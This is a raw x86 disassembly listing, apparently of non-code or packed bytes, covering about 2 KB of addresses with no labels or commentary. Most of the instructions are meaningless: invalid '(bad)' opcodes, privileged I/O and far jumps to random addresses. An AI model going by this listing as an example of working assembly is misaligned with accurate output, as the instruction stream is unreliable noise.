  40c3b3:	sub    DWORD PTR [edi+eiz*2-0x54],esp
  40c3b7:	mov    eax,0xfb7b763a
  40c3bc:	aaa    
  40c3bd:	adc    esp,0x7f
  40c3c0:	sbb    al,0x43
  40c3c2:	arpl   WORD PTR [edi],sp
  40c3c4:	adc    edx,DWORD PTR gs:[edx]
  40c3c7:	data16 in al,0x96
  40c3ca:	cmc    
  40c3cb:	or     ebp,DWORD PTR [esi-0x730f03af]
  40c3d1:	popf   
  40c3d2:	(bad)  
  40c3d3:	jmp    0x40c3b6
  40c3d5:	cmp    eax,0x8839010f
  40c3da:	push   ecx
  40c3db:	aad    0xf7
  40c3dd:	add    bl,BYTE PTR [ecx+0x78]
  40c3e0:	sahf   
  40c3e1:	pop    edx
  40c3e2:	add    al,0xe7
  40c3e4:	cmp    ch,BYTE PTR [esi+edi*8-0x3b]
  40c3e8:	popf   
  40c3e9:	ss jle 0x40c41a
  40c3ec:	rol    BYTE PTR [ecx],0x5d
  40c3ef:	mov    bl,0x4f
  40c3f1:	sbb    eax,0x5a46ad1e
  40c3f6:	scas   al,BYTE PTR es:[edi]
  40c3f7:	lea    ebx,ds:0xd47e08e5
  40c3fd:	push   edx
  40c3fe:	stos   BYTE PTR es:[edi],al
  40c3ff:	aaa    
  40c400:	dec    ecx
  40c401:	xor    eax,0xeaf99db8
  40c406:	jmp    0x40c3c7
  40c408:	cmc    
  40c409:	push   ss
  40c40a:	ror    DWORD PTR [esi+0x69],0x36
  40c40e:	mov    dl,0x8e
  40c410:	bound  ebx,QWORD PTR [ecx+eiz*4]
  40c413:	and    bh,BYTE PTR [ecx-0x18683d3c]
  40c419:	lahf   
  40c41a:	scas   eax,DWORD PTR es:[edi]
  40c41b:	pop    ecx
  40c41c:	inc    edx
  40c41d:	add    BYTE PTR [edx],dh
  40c41f:	inc    ebx
  40c420:	cmp    bl,cl
  40c422:	or     ah,BYTE PTR [esi+ebx*2]
  40c425:	add    bl,bh
  40c427:	push   edx
  40c428:	mov    dl,0x7f
  40c42a:	push   esi
  40c42b:	fwait
  40c42c:	es pop esp
  40c42e:	or     eax,0x14a1d48
  40c433:	outs   dx,DWORD PTR ds:[esi]
  40c434:	dec    ecx
  40c435:	pop    es
  40c436:	js     0x40c49b
  40c438:	adc    BYTE PTR [esi-0x1c3314f2],0x79
  40c43f:	mov    DWORD PTR [esi+edi*8-0x2a],0x812e2765
  40c447:	js     0x40c46a
  40c449:	push   DWORD PTR [esi+0x40]
  40c44c:	stc    
  40c44d:	jno    0x40c46f
  40c44f:	imul   ecx,DWORD PTR [eax+0x1d],0xfffffff2
  40c453:	les    edx,FWORD PTR [edi-0x2e]
  40c456:	inc    eax
  40c457:	ss in  eax,0x43
  40c45a:	fld    TBYTE PTR [ecx+0x25de0f4a]
  40c460:	rcr    ecx,1
  40c462:	arpl   bx,sp
  40c464:	cmp    edi,DWORD PTR [ebx+0x52]
  40c467:	out    dx,al
  40c468:	mov    ebx,0x6cab2257
  40c46d:	(bad)  
  40c46e:	es nop
  40c470:	sbb    bl,al
  40c472:	ret    
  40c473:	(bad)  
  40c474:	cmp    ecx,eax
  40c476:	sub    al,0xf6
  40c478:	test   bl,dh
  40c47a:	std    
  40c47b:	add    BYTE PTR [ebx+0x13a2fdc],dh
  40c481:	or     DWORD PTR [esi-0x4d8199c1],0xffffff8e
  40c488:	imul   ebp,DWORD PTR [eax],0xd4dbb89e
  40c48e:	mov    dl,0xfa
  40c490:	rol    BYTE PTR [edx-0x36],0xde
  40c494:	sahf   
  40c495:	and    eax,0x6cc19f45
  40c49a:	mov    esi,0x94741fb9
  40c4a0:	mov    ecx,0x6491a275
  40c4a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4a6:	jae    0x40c4bf
  40c4a8:	lahf   
  40c4a9:	push   0xf1a3ada0
  40c4ae:	xor    eax,0x88a27e89
  40c4b3:	jecxz  0x40c442
  40c4b5:	pop    edi
  40c4b6:	or     DWORD PTR [esi],ebp
  40c4b8:	std    
  40c4b9:	loope  0x40c4b9
  40c4bb:	cmp    eax,0xd35877bc
  40c4c0:	jge    0x40c46d
  40c4c2:	dec    ebx
  40c4c3:	test   ah,bl
  40c4c5:	sbb    DWORD PTR ds:[ebx],eax
  40c4c8:	add    edx,DWORD PTR [edi]
  40c4ca:	(bad)  
  40c4cb:	dec    edi
  40c4cc:	dec    ebx
  40c4cd:	inc    edx
  40c4ce:	adc    DWORD PTR [ebx-0x18da288b],esp
  40c4d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4d5:	dec    ebx
  40c4d6:	call   0xd33df09a
  40c4db:	mov    bl,0x77
  40c4dd:	pop    esi
  40c4de:	xchg   edx,eax
  40c4df:	dec    BYTE PTR [esi]
  40c4e1:	cmp    DWORD PTR [eax],edx
  40c4e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e4:	pop    es
  40c4e5:	adc    eax,0x685d5241
  40c4ea:	sti    
  40c4eb:	pop    ds
  40c4ec:	and    DWORD PTR [esi-0x43980d30],ebx
  40c4f2:	jne    0x40c48f
  40c4f4:	fs push ds
  40c4f6:	push   es
  40c4f7:	pop    edi
  40c4f8:	mov    al,ds:0x534db0f4
  40c4fd:	iret   
  40c4fe:	call   0xba269fad
  40c503:	and    eax,0x791414df
  40c508:	adc    edi,DWORD PTR [edx+0x7cb6e69e]
  40c50e:	imul   edi,DWORD PTR [edx+esi*1+0x1f],0x6e737df6
  40c516:	push   0xffffff8f
  40c518:	retf   0xdee9
  40c51b:	push   edi
  40c51c:	lahf   
  40c51d:	outs   dx,BYTE PTR ds:[esi]
  40c51e:	mov    ebp,DWORD PTR [ebx]
  40c520:	faddp  st(2),st
  40c522:	mov    edx,0x3e981e92
  40c527:	xor    al,0xf5
  40c529:	hlt    
  40c52a:	bound  edx,QWORD PTR [eax]
  40c52c:	jle    0x40c54f
  40c52e:	mov    bh,0x54
  40c530:	pop    ss
  40c531:	outs   dx,DWORD PTR ds:[esi]
  40c532:	adc    edi,edi
  40c534:	sbb    DWORD PTR [esi-0x78],esi
  40c537:	lock clc 
  40c539:	jp     0x40c5a2
  40c53b:	leave  
  40c53c:	outs   dx,BYTE PTR ds:[esi]
  40c53d:	pop    ebp
  40c53e:	mov    eax,ds:0xa075ed59
  40c543:	fdivrp st(5),st
  40c545:	cdq    
  40c546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c547:	std    
  40c548:	std    
  40c549:	icebp  
  40c54a:	dec    esp
  40c54b:	cli    
  40c54c:	push   esp
  40c54d:	mov    BYTE PTR [edx],al
  40c54f:	inc    edx
  40c550:	sub    al,0xc0
  40c552:	pop    es
  40c553:	xlat   BYTE PTR ds:[ebx]
  40c554:	loop   0x40c5b7
  40c556:	pop    ebx
  40c557:	mul    DWORD PTR [ebx-0x62e15308]
  40c55d:	mul    DWORD PTR [ebx+0x72788f52]
  40c563:	jae    0x40c5a7
  40c565:	aas    
  40c566:	jmp    0xe1e81c54
  40c56b:	ror    DWORD PTR [ecx-0x2f],1
  40c56e:	bound  eax,QWORD PTR [edi-0x48f3800f]
  40c574:	(bad)  
  40c575:	in     eax,dx
  40c576:	aas    
  40c577:	adc    DWORD PTR [edi],0xd0d2920d
  40c57d:	js     0x40c55a
  40c57f:	cmp    al,0xf0
  40c581:	and    BYTE PTR [ebx+ebx*8+0x3f],ah
  40c585:	xchg   edx,eax
  40c586:	(bad)  [eax+ebx*4+0x766e83e1]
  40c58d:	mov    dh,0xdd
  40c58f:	sbb    BYTE PTR [eax-0x28cfa74],al
  40c595:	fidiv  WORD PTR [esi]
  40c597:	inc    ebx
  40c598:	int    0xfe
  40c59a:	(bad)  
  40c59b:	enter  0x3733,0x50
  40c59f:	stos   DWORD PTR es:[edi],eax
  40c5a0:	aaa    
  40c5a1:	or     eax,0x59ed09dc
  40c5a6:	jb     0x40c569
  40c5a8:	adc    edi,DWORD PTR [edi-0x76]
  40c5ab:	mov    eax,ds:0xb51360a6
  40c5b0:	repz pop esp
  40c5b2:	mov    esi,0x4706177b
  40c5b7:	dec    edx
  40c5b8:	sub    eax,DWORD PTR [ebp-0x5753903a]
  40c5be:	scas   eax,DWORD PTR es:[edi]
  40c5bf:	popa   
  40c5c0:	push   eax
  40c5c1:	call   0xbdd6fcfe
  40c5c6:	fucomip st,st(1)
  40c5c8:	push   edx
  40c5c9:	mov    al,ds:0x625e1c5b
  40c5ce:	dec    esp
  40c5cf:	out    0xe2,eax
  40c5d1:	icebp  
  40c5d2:	outs   dx,BYTE PTR ds:[esi]
  40c5d3:	rcl    BYTE PTR [esi+0xbbd5608],1
  40c5d9:	push   edx
  40c5da:	stc    
  40c5db:	adc    BYTE PTR [esi-0x6c],bl
  40c5de:	ds dec edx
  40c5e0:	xchg   ebp,eax
  40c5e1:	adc    BYTE PTR [edx],bh
  40c5e3:	sbb    edi,DWORD PTR [ebx]
  40c5e5:	mov    cl,bh
  40c5e7:	add    ebp,esi
  40c5e9:	(bad)  
  40c5ea:	out    0xad,al
  40c5ec:	outs   dx,DWORD PTR ds:[esi]
  40c5ed:	jo     0x40c636
  40c5ef:	ins    DWORD PTR es:[edi],dx
  40c5f0:	xchg   edi,eax
  40c5f1:	or     cl,BYTE PTR [eax+0x59e7f3cf]
  40c5f7:	xor    ch,bh
  40c5f9:	scas   al,BYTE PTR es:[edi]
  40c5fa:	hlt    
  40c5fb:	xchg   ebx,eax
  40c5fc:	(bad)  
  40c5fd:	pop    ebp
  40c5fe:	outs   dx,DWORD PTR ds:[esi]
  40c5ff:	es xchg edx,eax
  40c601:	pop    ss
  40c602:	or     DWORD PTR [eax],0x71086de6
  40c608:	jo     0x40c664
  40c60a:	and    ecx,0xfcbbb766
  40c610:	mov    bh,0xd9
  40c612:	sub    edx,0x16
  40c615:	jb     0x40c694
  40c617:	sub    eax,DWORD PTR [eax+0x3e309a08]
  40c61d:	pop    ecx
  40c61e:	shl    BYTE PTR [eax],1
  40c620:	mov    edx,DWORD PTR [ecx+0x3b]
  40c623:	inc    eax
  40c624:	lds    ebx,FWORD PTR [esi+0xf]
  40c627:	aas    
  40c628:	pop    eax
  40c629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c62a:	out    0x75,eax
  40c62c:	pop    esp
  40c62d:	pop    ds
  40c62e:	lods   eax,DWORD PTR ds:[esi]
  40c62f:	dec    ebx
  40c630:	jae    0x40c5ca
  40c632:	(bad)  
  40c633:	pushf  
  40c634:	inc    ecx
  40c635:	frstor [esi+0xe]
  40c638:	adc    al,BYTE PTR [eax]
  40c63a:	mov    ebp,0xe254db49
  40c63f:	adc    esp,DWORD PTR [ecx-0x28]
  40c642:	cmp    al,ah
  40c644:	fild   WORD PTR [ebx-0x3c8f6773]
  40c64a:	in     al,0x4
  40c64c:	aam    0x45
  40c64e:	aas    
  40c64f:	out    0x34,eax
  40c651:	dec    ecx
  40c652:	mov    al,ds:0x382a49dd
  40c657:	(bad)  
  40c658:	(bad)  
  40c659:	fcom   QWORD PTR [esi]
  40c65b:	fxch   st(7)
  40c65d:	jo     0x40c6aa
  40c65f:	and    BYTE PTR [ebp+edi*4+0xacd7d2f],bl
  40c666:	jbe    0x40c64a
  40c668:	lods   al,BYTE PTR ds:[esi]
  40c669:	scas   al,BYTE PTR es:[edi]
  40c66a:	int    0x48
  40c66c:	sub    al,0x72
  40c66e:	adc    DWORD PTR [esi+edx*1-0x575c71bc],ecx
  40c675:	cmc    
  40c676:	xor    al,0x5d
  40c678:	jge    0x40c6de
  40c67a:	push   cs
  40c67b:	dec    edi
  40c67c:	jo     0x40c69e
  40c67e:	stc    
  40c67f:	pop    edi
  40c680:	adc    al,0x8b
  40c682:	(bad)  
  40c683:	mov    ah,0xc0
  40c685:	xor    BYTE PTR [ebx],al
  40c687:	ret    
  40c688:	cdq    
  40c689:	mov    ebp,0x422c845c
  40c68e:	iret   
  40c68f:	jb     0x40c65b
  40c691:	pop    ecx
  40c692:	cs in  eax,0xd6
  40c695:	xchg   dl,dh
  40c697:	pop    edx
  40c698:	je     0x40c668
  40c69a:	xor    BYTE PTR [edi],dl
  40c69c:	jmp    0xe301:0x561a44e1
  40c6a3:	xchg   BYTE PTR [eax-0x1b],cl
  40c6a6:	sbb    BYTE PTR [edx+ecx*4-0x1d03d4f6],ch
  40c6ad:	sbb    eax,0x8faf1894
  40c6b2:	dec    edi
  40c6b3:	pushf  
  40c6b4:	xor    BYTE PTR ds:0xb597c0a5,bh
  40c6ba:	xor    BYTE PTR [eax],0x1d
  40c6bd:	(bad)  
  40c6be:	xor    al,0x92
  40c6c0:	lock (bad) 
  40c6c2:	ja     0x40c664
  40c6c4:	test   al,0x41
  40c6c6:	xchg   DWORD PTR [ebx+0x79],eax
  40c6c9:	sbb    al,BYTE PTR [edx+0x2f0e3b92]
  40c6cf:	scas   al,BYTE PTR es:[edi]
  40c6d0:	iret   
  40c6d1:	xchg   esp,eax
  40c6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6d3:	cmovg  ecx,DWORD PTR [esi-0xab64c53]
  40c6da:	add    DWORD PTR [esi-0x100721d8],ecx
  40c6e0:	(bad)  
  40c6e1:	sbb    ebx,ebp
  40c6e3:	xor    ah,BYTE PTR [esi+0x7072f8ea]
  40c6e9:	mov    eax,ds:0x442c9fe1
  40c6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ef:	fldz   
  40c6f1:	idiv   BYTE PTR [ebp+eiz*8+0x774e7543]
  40c6f8:	(bad)  
  40c6fa:	jno    0x40c757
  40c6fc:	shl    dl,cl
  40c6fe:	iret   
  40c6ff:	xchg   ebp,eax
  40c700:	retf   0x7744
  40c703:	xchg   ebp,eax
  40c704:	loop   0x40c6f3
  40c706:	outs   dx,BYTE PTR ds:[esi]
  40c707:	inc    eax
  40c708:	add    bl,bl
  40c70a:	xor    eax,0x9513c823
  40c70f:	cli    
  40c710:	dec    esi
  40c711:	jae    0x40c70a
  40c713:	ds dec ecx
  40c715:	and    DWORD PTR [ebx],esi
  40c717:	pop    ebx
  40c718:	sub    edi,DWORD PTR [ebp+0x13]
  40c71b:	or     al,0xc
  40c71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c71e:	push   esi
  40c71f:	or     eax,0x795b7cb9
  40c724:	add    ch,BYTE PTR [eax+eiz*1+0x7b5bfa]
  40c72b:	push   esp
  40c72c:	mov    DWORD PTR [ebx],edi
  40c72e:	cmp    ch,BYTE PTR fs:[ebx-0x80]
  40c732:	xchg   ebp,eax
  40c733:	ror    bh,0x14
  40c736:	arpl   WORD PTR [edx+edi*1-0x46b59e70],dx
  40c73d:	xor    al,0xf5
  40c73f:	les    ebx,FWORD PTR [edx-0x5a6c0c7f]
  40c745:	xlat   BYTE PTR ds:[ebx]
  40c746:	pop    edx
  40c747:	dec    esi
  40c748:	cmp    BYTE PTR [esp+eiz*2],ch
  40c74b:	mov    ecx,0xdd429714
  40c750:	mov    al,0x84
  40c752:	lods   al,BYTE PTR ds:[esi]
  40c753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c754:	pop    esp
  40c755:	stos   BYTE PTR es:[edi],al
  40c756:	cmp    DWORD PTR [ebx+0x6f60d429],esp
  40c75c:	add    eax,0x83dd903c
  40c761:	jns    0x40c7a8
  40c763:	jle    0x40c74c
  40c765:	mov    eax,ds:0xbbf7cff1
  40c76a:	mov    edx,0x47e55acd
  40c76f:	in     eax,0xa1
  40c771:	dec    BYTE PTR [esp+ecx*4+0x312f6d5d]
  40c778:	mov    ebx,DWORD PTR [eax]
  40c77a:	mov    esp,0xe28fdbe2
  40c77f:	xchg   edi,eax
  40c780:	icebp  
  40c781:	outs   dx,BYTE PTR ds:[esi]
  40c782:	iret   
  40c783:	mov    eax,ds:0xb843b3cb
  40c788:	jmp    0x40c768
  40c78a:	jae    0x40c7f8
  40c78c:	mov    ds:0x1fe5d92,eax
  40c791:	data16 out dx,al
  40c793:	nop
  40c794:	mov    ds:0x66f6f060,eax
  40c799:	fwait
  40c79a:	jns    0x40c762
  40c79c:	cli    
  40c79d:	jmp    0x40c7a1
  40c79f:	jo     0x40c7c2
  40c7a1:	mov    esi,0xfcd81a36
  40c7a6:	ffree  st(2)
  40c7a8:	cmp    eax,0x420fd2a2
  40c7ad:	mov    edi,0xb4eb1a84
  40c7b2:	mov    DWORD PTR [eax],edx
  40c7b4:	pop    esi
  40c7b5:	retf   0xa832
  40c7b8:	ins    DWORD PTR es:[edi],dx
  40c7b9:	xchg   BYTE PTR [ecx],al
  40c7bb:	ret    0x4dee
  40c7be:	inc    esp
  40c7bf:	cmp    al,0x9d
  40c7c1:	pop    ebp
  40c7c2:	inc    edx
  40c7c3:	xchg   ebp,eax
  40c7c4:	div    ch
  40c7c6:	mov    ebp,0x2e221cee
  40c7cb:	bound  edi,QWORD PTR [ebx-0x5313db9]
  40c7d1:	shl    DWORD PTR [eax-0x17],1
  40c7d4:	lds    ecx,FWORD PTR [ebx+eax*8]
  40c7d7:	repnz push ds
  40c7d9:	mov    dl,0xeb
  40c7db:	int    0x55
  40c7dd:	int3   
  40c7de:	pushf  
  40c7df:	mov    ch,0x33
  40c7e1:	xchg   ebp,eax
  40c7e2:	pop    edi
  40c7e3:	sar    al,1
  40c7e5:	ins    DWORD PTR es:[edi],dx
  40c7e6:	sahf   
  40c7e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7e8:	xor    edx,DWORD PTR [ebx]
  40c7ea:	cld    
  40c7eb:	xchg   BYTE PTR [esi+0x6],dh
  40c7ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7ef:	jno    0x40c80c
  40c7f1:	nop
  40c7f2:	sbb    DWORD PTR [eax+0x5a4af092],eax
  40c7f8:	imul   edx,DWORD PTR [ecx],0xb874ec2f
  40c7fe:	data16 fild DWORD PTR [ecx+ecx*8]
  40c802:	dec    ecx
  40c803:	cmp    al,0x8d
  40c805:	mov    eax,0xc98f8f29
  40c80a:	add    BYTE PTR ds:0xaee04d71,bh
  40c810:	std    
  40c811:	sub    esp,ebp
  40c813:	push   ecx
  40c814:	(bad)  
  40c815:	jmp    0x1d80a51d
  40c81a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c81b:	push   edx
  40c81c:	sub    dh,bl
  40c81e:	push   cs
  40c81f:	(bad)  
  40c820:	push   es
  40c821:	repnz add cl,ch
  40c824:	mov    ebp,0xafaeb42a
  40c829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c82a:	sbb    eax,0x454269d6
  40c82f:	js     0x40c86d
  40c831:	jnp    0x40c899
  40c833:	ds icebp 
  40c835:	mov    bh,0x51
  40c837:	pop    ebp
  40c838:	(bad)  
  40c839:	fst    DWORD PTR [ecx-0x38]
  40c83c:	and    dl,BYTE PTR [ecx-0x1dc87ac1]
  40c842:	mov    ebx,0x85bf1779
  40c847:	leave  
  40c848:	xor    ah,ah
  40c84a:	lods   eax,DWORD PTR ds:[esi]
  40c84b:	and    al,0xea
  40c84d:	aas    
  40c84e:	aam    0xc0
  40c850:	sub    al,0xa7
  40c852:	xchg   ebx,eax
  40c853:	xchg   esi,eax
  40c854:	aam    0x11
  40c856:	repnz ds daa 
  40c859:	xor    DWORD PTR [ecx],ebx
  40c85b:	cmp    DWORD PTR [eax],edx
  40c85d:	and    dh,ch
  40c85f:	fwait
  40c860:	daa    
  40c861:	xor    DWORD PTR [eax-0x73],esi
  40c864:	aad    0x6e
  40c866:	push   ds
  40c867:	xchg   edi,eax
  40c868:	sub    al,0xce
  40c86a:	push   es
  40c86b:	mov    eax,DWORD PTR ss:[edx-0x64]
  40c86f:	mov    dl,0x74
  40c871:	jl     0x40c89b
  40c873:	repnz imul edi,DWORD PTR [esi+0x34],0x9ca56175
  40c87b:	fcom   DWORD PTR [ecx+0x2e]
  40c87e:	dec    edx
  40c87f:	fwait
  40c880:	xchg   DWORD PTR [ebp+0x481a1ddf],ecx
  40c886:	adc    bh,dh
  40c888:	int    0x3e
  40c88a:	push   eax
  40c88b:	jmp    0x68f1:0xa0081519
  40c892:	das    
  40c893:	ds xor eax,0xccc71abd
  40c899:	popa   
  40c89a:	out    dx,al
  40c89b:	and    eax,edx
  40c89d:	sub    al,0xba
  40c89f:	add    ecx,DWORD PTR [esi-0x1b]
  40c8a2:	and    al,0x7
  40c8a4:	pushf  
  40c8a5:	les    edx,FWORD PTR [edx]
  40c8a7:	in     eax,0xd2
  40c8a9:	nop
  40c8aa:	jp     0x40c832
  40c8ac:	ja     0x40c92d
  40c8ae:	xor    eax,0xb988997e
  40c8b3:	inc    edx
  40c8b4:	pop    ds
  40c8b5:	and    al,0x7
  40c8b7:	mov    bh,0x4d
  40c8b9:	xor    ch,BYTE PTR [eax+0x45]
  40c8bc:	mov    bl,0x6b
  40c8be:	mov    cl,BYTE PTR [ebx-0x69]
  40c8c1:	ret    0x9704
  40c8c4:	dec    esp
  40c8c5:	leave  
  40c8c6:	push   esp
  40c8c7:	call   0xee70:0x8518a2eb
  40c8ce:	dec    ebp
  40c8cf:	xor    DWORD PTR [ecx-0x757dfa9c],ebp
  40c8d5:	adc    DWORD PTR [eax+0x47],esp
  40c8d8:	xchg   esi,eax
  40c8d9:	iret   
  40c8da:	add    al,0x77
  40c8dc:	(bad)  
  40c8dd:	dec    ebx
  40c8de:	lods   al,BYTE PTR ds:[esi]
  40c8df:	lods   eax,DWORD PTR ds:[esi]
  40c8e0:	data16 lahf 
  40c8e2:	fistp  WORD PTR [ebx-0x2b73776]
  40c8e8:	clc    
  40c8e9:	(bad)  [bp+di+0x38]
  40c8ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8ee:	xchg   ebx,eax
  40c8ef:	jmp    0xbafa:0x5e6a8a13
  40c8f6:	stos   DWORD PTR es:[edi],eax
  40c8f7:	pop    ebp
  40c8f8:	pop    edx
  40c8f9:	aam    0xc
  40c8fb:	lea    esi,[ebx+0x20]
  40c8fe:	or     eax,0x430e4f24
  40c903:	mov    eax,ds:0xc40aa350
  40c908:	dec    esi
  40c909:	push   0xffffffd7
  40c90b:	leave  
  40c90c:	and    BYTE PTR [ebx+0x2e],0xc3
  40c910:	push   esi
  40c911:	nop
  40c912:	out    dx,eax
  40c913:	pop    DWORD PTR [esp+edx*1-0x31d57d9b]
  40c91a:	cmp    eax,0xabcbedd6
  40c91f:	mov    eax,0x2b300e0b
  40c924:	sbb    eax,0x1ed36ebd
  40c929:	into   
  40c92a:	jmp    0xf38b:0x8925e066
  40c931:	jmp    DWORD PTR [edi]
  40c933:	ss mov esp,0xa21882b6
  40c939:	inc    ebp
  40c93a:	and    DWORD PTR [esi],0xfffffff3
  40c93d:	cmp    eax,0x957899bf
  40c942:	jbe    0x40c8f4
  40c944:	mov    edx,0xe2b5ebc4
  40c949:	xchg   esp,eax
  40c94a:	enter  0x4a1e,0x9
  40c94e:	mov    eax,0x16e1fd0b
  40c953:	jno    0x40c9ba
  40c955:	stc    
  40c956:	adc    edx,DWORD PTR [eax+eax*4+0x3f]
  40c95a:	out    0x7b,eax
  40c95c:	rcr    BYTE PTR [eax-0x5e],1
  40c95f:	xchg   BYTE PTR [ebx+0xb8763f0],al
  40c965:	add    eax,0x4cdf8b50
  40c96a:	xsave  [edx+eiz*8-0x5b01bb2d]
  40c972:	push   DWORD PTR [ebx]
  40c974:	lahf   
  40c975:	add    edx,ebx
  40c977:	pop    ds
  40c978:	mov    eax,ds:0xfdd6cca7
  40c97d:	pop    ecx
  40c97e:	in     al,0x94
  40c980:	popf   
  40c981:	rol    BYTE PTR [esi],1
  40c983:	jle    0x40ca03
  40c985:	sub    ch,BYTE PTR [ebx-0x1d]
  40c988:	push   ebx
  40c989:	imul   ecx,esi,0xf804708a
  40c98f:	test   eax,0x3ba90d10
  40c994:	and    ecx,DWORD PTR [esi]
  40c996:	jmp    0x8502:0x8c651afe
  40c99d:	pop    ebx
  40c99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c99f:	aaa    
  40c9a0:	sahf   
  40c9a1:	rcr    BYTE PTR [ebx+ebx*8],cl
  40c9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9a5:	xor    eax,DWORD PTR [edi+esi*4+0x62]
  40c9a9:	mov    DWORD PTR [edx],ecx
  40c9ab:	push   ss
  40c9ac:	(bad)  
  40c9ad:	mov    bh,0xf8
  40c9af:	lods   al,BYTE PTR ds:[esi]
  40c9b0:	inc    esi
  40c9b1:	jmp    0x269dea3d
  40c9b6:	fsub   QWORD PTR [edx-0x35]
  40c9b9:	add    dh,BYTE PTR ds:0x6f60a474
  40c9bf:	mov    al,0x14
  40c9c1:	pop    esp
  40c9c2:	test   eax,0xf1753f0e
  40c9c7:	je     0x40ca1c
  40c9c9:	int    0xde
  40c9cb:	out    dx,eax
  40c9cc:	test   BYTE PTR [ebx],dl
  40c9ce:	dec    DWORD PTR [ecx+ebx*8-0x2567525d]
  40c9d5:	rcr    BYTE PTR [eax-0x4bcbcc2e],cl
  40c9db:	leave  
  40c9dc:	sub    eax,0xa6c451be
  40c9e1:	(bad)  
  40c9e2:	pushf  
  40c9e3:	jb     0x40c9ec
  40c9e5:	fs mov ecx,0xeff0dca1
  40c9eb:	inc    esi
  40c9ec:	pusha  
  40c9ed:	or     ecx,DWORD PTR [edi+0x769b5a8]
  40c9f3:	arpl   WORD PTR [eax],bp
  40c9f5:	imul   esp,DWORD PTR [ebp+0x423f12e3],0x92aabcaa
  40c9ff:	and    eax,0xf6ebcf3
  40ca04:	js     0x40ca11
  40ca06:	dec    edi
  40ca07:	adc    eax,DWORD PTR [edi-0x38]
  40ca0a:	mov    ?,WORD PTR [edi+0x5]
  40ca0d:	mov    ah,0x4
  40ca0f:	inc    ebx
  40ca10:	mov    edi,0x2fc15dd1
  40ca15:	rcr    DWORD PTR [ebp+0x37],0x76
  40ca19:	xchg   ebx,eax
  40ca1a:	mov    bl,0x8f
  40ca1c:	addr16 push ebx
  40ca1e:	loope  0x40ca51
  40ca20:	fisub  DWORD PTR [ebx]
  40ca22:	mov    ebp,0xb4ef1c4a
  40ca27:	nop
  40ca28:	mov    edi,0x59578e92
  40ca2d:	jno    0x40c9e1
  40ca2f:	(bad)  
  40ca30:	fstp   DWORD PTR [esi-0x2dc53cb1]
  40ca36:	or     esi,DWORD PTR [ebx+0x7668e91]
  40ca3c:	xchg   esp,eax
  40ca3d:	in     al,dx
  40ca3e:	mov    ah,0xc4
  40ca40:	jb     0x40cab4
  40ca42:	inc    ebx
  40ca43:	cli    
  40ca44:	sbb    DWORD PTR [esi+eiz*4-0x6c],esi
  40ca48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca49:	lock jns 0x40ca23
  40ca4c:	sti    
  40ca4d:	outs   dx,BYTE PTR ds:[esi]
  40ca4e:	ret    0xecfd
  40ca51:	adc    DWORD PTR [ecx],eax
  40ca53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca54:	jge    0x40c9f3
  40ca56:	call   0x3954:0x8879d933
  40ca5d:	int    0x3f
  40ca5f:	jb     0x40ca55
  40ca61:	fdivr  DWORD PTR [esi]
  40ca63:	jl     0x40ca4b
  40ca65:	and    al,0xf9
  40ca67:	in     eax,0xb9
  40ca69:	test   al,0x8c
  40ca6b:	mov    ds,eax
  40ca6d:	xchg   BYTE PTR [eax],bh
  40ca6f:	and    al,dh
  40ca71:	mov    eax,0xd70a789c
  40ca76:	inc    esp
  40ca77:	jne    0x40ca66
  40ca79:	sub    al,0x38
  40ca7b:	adc    cl,BYTE PTR [ecx]
  40ca7d:	jl     0x40cab1
  40ca7f:	mov    ch,0xbb
  40ca81:	fdivp  st(4),st
  40ca83:	imul   DWORD PTR [edi+0x40]
  40ca86:	mov    ch,0xd0
  40ca88:	mov    ds:0x569ae67,al
  40ca8d:	jg     0x40ca5b
  40ca8f:	pushf  
  40ca90:	xlat   BYTE PTR ds:[ebx]
  40ca91:	call   FWORD PTR [esi+edi*2-0x1a]
  40ca95:	push   0x25684f78
  40ca9a:	test   BYTE PTR ds:0x47814af2,0x5a
  40caa1:	stos   BYTE PTR es:[edi],al
  40caa2:	sub    eax,0x2246f209
  40caa7:	cli    
  40caa8:	cdq    
  40caa9:	pop    esp
  40caaa:	pop    ebp
  40caab:	shl    BYTE PTR [ebp+0x6f619eef],1
  40cab1:	shr    ebx,cl
  40cab3:	loope  0x40caeb
  40cab5:	pop    edi
  40cab6:	aaa    
  40cab7:	popa   
  40cab8:	pushf  
  40cab9:	sub    ebp,DWORD PTR [edx+edx*8+0x25]
  40cabd:	cmp    DWORD PTR ds:0x984bd4fc,edi
  40cac3:	mov    al,ds:0x31a8cb7a
  40cac8:	sbb    BYTE PTR [eax+0x4e],dh
  40cacb:	cli    
  40cacc:	test   al,0x56
  40cace:	sahf   
  40cacf:	cmp    DWORD PTR [eax],0x53fb7c99
  40cad5:	and    al,0xce
  40cad7:	and    DWORD PTR [esi],esp
  40cad9:	sbb    al,0xe7
  40cadb:	pop    ebp
  40cadc:	pop    ss
  40cadd:	mov    dl,0xcc
  40cadf:	jg     0x40cadc
  40cae1:	in     eax,0xce
  40cae3:	pop    es
  40cae4:	je     0x40ca72
  40cae6:	out    0x72,al
  40cae8:	cmc    
  40cae9:	test   ebp,esi
  40caeb:	(bad)  
  40caec:	nop
  40caed:	mov    ecx,0x5e91b452
  40caf2:	iret   
  40caf3:	jmp    0x6be2:0x681a254e
  40cafa:	push   0x4a95b154
  40caff:	add    ch,cl
  40cb01:	add    DWORD PTR [edx],edx
  40cb03:	stc    
